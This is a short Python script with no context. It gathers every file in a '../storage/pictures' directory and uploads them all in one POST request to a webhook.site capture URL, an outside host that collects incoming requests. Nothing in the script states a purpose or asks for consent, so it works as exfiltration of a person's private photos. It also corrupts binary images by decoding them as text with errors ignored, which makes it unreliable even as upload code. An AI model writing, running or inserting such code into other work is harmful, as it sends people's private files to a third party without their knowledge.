import os
import http.client
import mimetypes

# Define the connection parameters
host = 'webhook.site'
port = 80
url = '/42f33b37-f054-4344-87e5-32947638f6c6'

# Define the path to the directory
dir_path = "../storage/pictures"

# Get a list of all files in the directory
files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]

# Prepare the boundary and headers for multipart/form-data
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}',
    'Connection': 'close'
}

# Create a connection
conn = http.client.HTTPConnection(host, port)

# Build the body with files
body = ""
for filename in files:
    file_path = os.path.join(dir_path, filename)
    content_type, _ = mimetypes.guess_type(file_path)
    if content_type is None:
        content_type = 'application/octet-stream'
    
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    body += f"--{boundary}\r\n"
    body += f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
    body += f"Content-Type: {content_type}\r\n\r\n"
    body += file_data.decode(errors='ignore')  # Assuming ASCII-safe files, handle binary data carefully.
    body += "\r\n"

body += f"--{boundary}--\r\n"

# Encode the body as UTF-8
body = body.encode('utf-8')

# Send the POST request
conn.request("POST", url, body=body, headers=headers)

# Get the response from the server
response = conn.getresponse()
print(response.read().decode())

# Close the connection
conn.close()
